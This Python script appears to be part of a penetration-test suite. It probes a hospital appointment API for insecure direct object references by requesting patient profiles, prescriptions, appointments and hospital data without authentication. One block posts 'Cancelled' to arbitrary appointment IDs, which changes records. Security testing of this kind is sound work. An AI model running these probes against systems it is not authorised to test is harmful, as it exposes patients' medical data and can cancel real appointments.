"""
TEST CAT 3 — IDOR (Insecure Direct Object Reference)
Varies ID parameters to attempt access to other principals' objects.
No auth headers needed — because the API has no auth enforcement.
Checks: patient emails, appointment IDs, hospital IDs, doctor IDs.
"""
import sys, time
sys.path.insert(0, str(__import__('pathlib').Path(__file__).parent))
from helpers import BASE, req, record, save_results

# Probe IDs — use values unlikely to match real data but still valid-looking
PROBE_EMAILS = [
    "other_user_1@gmail.com",
    "admin@hospital.com",
    "test.patient@mediconnect.com",
]
PROBE_APPT_IDS  = [1, 2, 3, 99]
PROBE_HOSP_IDS  = [1, 2, 99]
PROBE_DOC_IDS   = ["MED-DOC-2026-00001", "MED-DOC-2026-00002"]

print("=" * 60)
print("TEST 3 — IDOR")
print(f"Target: {BASE}")
print("=" * 60)

# 3a — Patient profile IDOR: any email retrieves any profile
for email in PROBE_EMAILS:
    time.sleep(0.15)
    r = req("GET", "/get-patient-profile", params={"email": email})
    # A 200 with non-null body = data leak
    is_finding = r["ok"] and r["status"] == 200 and r["body"] not in ["null", "None", "{}", ""]
    record("/get-patient-profile", "GET", "anon", r, 401,
           "idor", is_finding, "HIGH" if is_finding else "INFO",
           f"IDOR: email={email} returned profile data" if is_finding else f"No data for {email}")

# 3b — Patient appointments IDOR
for email in PROBE_EMAILS:
    time.sleep(0.15)
    r = req("GET", "/get-patient-appointments", params={"patient_email": email})
    is_finding = r["ok"] and r["status"] == 200 and '"appointments"' in r["body"]
    record("/get-patient-appointments", "GET", "anon", r, 401,
           "idor", is_finding, "HIGH" if is_finding else "INFO",
           f"IDOR appts: email={email}")

# 3c — Patient prescriptions IDOR
for email in PROBE_EMAILS:
    time.sleep(0.15)
    r = req("GET", "/get-patient-prescriptions", params={"patient_email": email})
    is_finding = r["ok"] and r["status"] == 200
    record("/get-patient-prescriptions", "GET", "anon", r, 401,
           "idor", is_finding, "HIGH" if is_finding else "INFO",
           f"IDOR prescriptions: email={email}")

# 3d — Hospital appointments IDOR (any hospital_id)
for hid in PROBE_HOSP_IDS:
    time.sleep(0.15)
    r = req("GET", "/get-hospital-appointments", params={"hospital_id": hid})
    is_finding = r["ok"] and r["status"] == 200 and '"appointments"' in r["body"]
    record("/get-hospital-appointments", "GET", "anon", r, 401,
           "idor", is_finding, "HIGH" if is_finding else "INFO",
           f"IDOR hospital appts: hospital_id={hid}")

# 3e — Hospital analytics IDOR
for hid in PROBE_HOSP_IDS:
    time.sleep(0.15)
    r = req("GET", "/get-hospital-analytics", params={"hospital_id": hid})
    is_finding = r["ok"] and r["status"] == 200 and '"success": true' in r["body"].lower()
    record("/get-hospital-analytics", "GET", "anon", r, 401,
           "idor", is_finding, "HIGH" if is_finding else "INFO",
           f"IDOR analytics: hospital_id={hid}")

# 3f — Hospital beds IDOR
for hid in PROBE_HOSP_IDS:
    time.sleep(0.15)
    r = req("GET", "/get-hospital-beds", params={"hospital_id": hid})
    is_finding = r["ok"] and r["status"] == 200
    record("/get-hospital-beds", "GET", "anon", r, 401,
           "idor", is_finding, "HIGH" if is_finding else "INFO",
           f"IDOR beds: hospital_id={hid}")

# 3g — Update appointment status with arbitrary appointment_id
for appt_id in PROBE_APPT_IDS:
    time.sleep(0.15)
    r = req("POST", "/update-appointment-status",
            json_body={"appointment_id": appt_id, "status": "Cancelled"})
    is_finding = r["ok"] and r["status"] == 200 and '"success": true' in r["body"].lower()
    record("/update-appointment-status", "POST", "anon", r, 401,
           "idor", is_finding, "HIGH" if is_finding else "INFO",
           f"IDOR appt status: appt_id={appt_id}")

save_results("results_03_idor.json")
print("\nTest 3 complete.")
